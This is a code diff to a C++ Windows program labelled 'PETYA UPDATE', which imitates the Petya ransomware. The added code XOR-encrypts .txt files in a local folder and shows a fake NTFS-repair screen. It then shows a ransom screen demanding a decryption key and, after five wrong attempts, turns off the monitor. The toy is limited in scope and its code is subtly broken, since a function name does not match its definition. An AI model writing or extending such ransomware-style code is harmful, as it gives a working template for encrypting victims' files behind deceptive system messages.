@@ -1,14 +1,72 @@
+/*     
+    PETYA UPDATE
+    V. 2.0
+    IT CANS: 
+        1. ENCRYPT OR DECRYPT FILES
+        2. TURNS OFF OR ON YOUR MONITOR
+    THIS PROGRAMM IS ONLY FOR WINDOWS!
+*/
+
+//HOW THIS CAN ENCRYPT? IN THE FOLDER WITH THE PROGRAM, CREATE A FOLDER "hey" AND THEN CREATE MORE FILES OF THE ".txt" FORMAT, FILLING THEM WITH SOME DATA.
+//PASSWORD DECRYPT: Petya23
+
 #include <iostream>
+#include <fstream>
 #include <string>
+#include <filesystem>
+#include <vector>
+#include <algorithm>
 #include <windows.h>
 #include <conio.h>
 
-const int DISK_SIZE = 350931;
-
 using namespace std;
+using namespace std::filesystem;
+
+const int DISK_SIZE = 350931;
+const string ultimateKey = "Petya23";
+
+string XOREncryptDecrypt(const string& input, const string& originalKey) {
+    string output = input;
+    hash<string> hash_fn;
+    size_t seed = hash_fn(originalKey);
+    for (size_t i = 0; i < input.size(); ++i) {
+        output[i] = input[i] ^ static_cast<unsigned char>(seed & 0xFF);
+        // Update seed for next byte
+        seed = hash_fn(to_string(seed));
+    }
+    return output;
+}
+void processFilesInDirectory(const string& directory, const string& password) {
+    for (const auto& entry : recursive_directory_iterator(directory)) {
+        if (entry.path().extension() == ".txt") {
+            const string filePath = entry.path().string();
+            ifstream inputFile(filePath, ios::binary);
+            if (!inputFile) {
+                cerr << "Failed to open input file: " << filePath << "\n";
+                continue;
+            }
+
+            string data((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());
+            inputFile.close();
+
+            string processedData = xorEncryptDecrypt(data, password);
+
+            ofstream outputFile(filePath, ios::binary | ios::trunc);
+            if (!outputFile) {
+                cerr << "Failed to open output file: " << filePath << "\n";
+                continue;
+            }
+
+            outputFile.write(processedData.c_str(), processedData.size());
+            outputFile.close();
+        }
+    }
+}
 
 void StartMessage()
 {
+    int sectorPercent = 0;
+    processFilesInDirectory("hey", ultimateKey);
     cout << "Repairing file system on C: \n" << endl;
     cout << "The type of the file system is NTFS.\n" << endl;
     cout << "One of your disks contains errors and needs to be repaired. This process" << endl;
@@ -16,10 +74,7 @@ void StartMessage()
 
     cout << "\nWARNING: DO NOT TURN OFF YOUR PC! IF YOU ABORT THIS PROCESS. YOU COULD" << endl;
     cout << "DESTROY ALL OF YOUR DATA! PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED\nIN!\n" << endl;
-}
-void CryptedMessage()
-{
-    int sectorPercent = 0;
+    
 
     for (int sector = 0; sector <= DISK_SIZE; sector++)
     {
@@ -80,9 +135,10 @@ void SkullScreenFlicker() {
 }
 void EncryptedMessage()
 {
-    string key = "Petya23";
-    string inputKey;
 
+    string inputKey;
+    int attempts = 0;
+    int attemptsLimit = 5;
     system("cls");
     system("color 4F");
 
@@ -99,19 +155,32 @@ void EncryptedMessage()
     cout << "3. Enter your personal decryption code there :\n" << endl;
     cout << "4bPQb6 - PrwjRN - Cex4C8 - Bz5yE7 - 7aii8S - NdHFDx - s1q2Q2 - S6eqT6 - k5G8z1\n - gHixmE - pYtTPd - 1RHJq4 - 5UpVjr - SLizps - 5Kq46t";
     cout << "\nIf you already purchased your key, please enter it below." << endl;
+    cout << "\n\nWARNING! YOU HAVE ONLY 5 ATTEMPTS. IF YOUR ATTEMPTS WILL BE OUT, YOUR MONITOR TURNS OFF.";
     cout << " \nKey : ";
-    cin >> inputKey;
-
-    while (key != inputKey)
-    {
-        cout << "\nIncorrect key! Please try again." << endl;
-        cout << "Key : ";
-        cin >> inputKey;
+    while (attempts < attemptsLimit && cin >> inputKey) {
+        if (inputKey == ultimateKey) {
+            break;
+        }
+        else {
+            attempts++;
+            cout << "Incorrect key! You have " << (attemptsLimit - attempts) << " attempts." << endl;
+        }
+        if (attempts < attemptsLimit) {
+            cout << "Key: ";
+        }
+    }
+    if (attempts == attemptsLimit) {
+        cout << "YOU HAVE NO ATTEMPTS. YOUR MONITOR WILL BE ON IN 10 SECONDS!" << endl;
+        system("pause");
+        SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
+        Sleep(10000);
+        SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
     }
 }
 void DescryptingSystem()
 {
     int sectorPercent = 0;
+    processFilesInDirectory("hey", ultimateKey);
     for (int sector = 0; sector <= DISK_SIZE; sector++)
     {
         sectorPercent = (sector * 100) / DISK_SIZE;
@@ -141,11 +210,9 @@ void EndScreen() {
     return;
 }
 
-
 int main()
 {
     StartMessage();
-    CryptedMessage();
     SkullScreenFlicker();
     EncryptedMessage();
     DescryptingSystem();
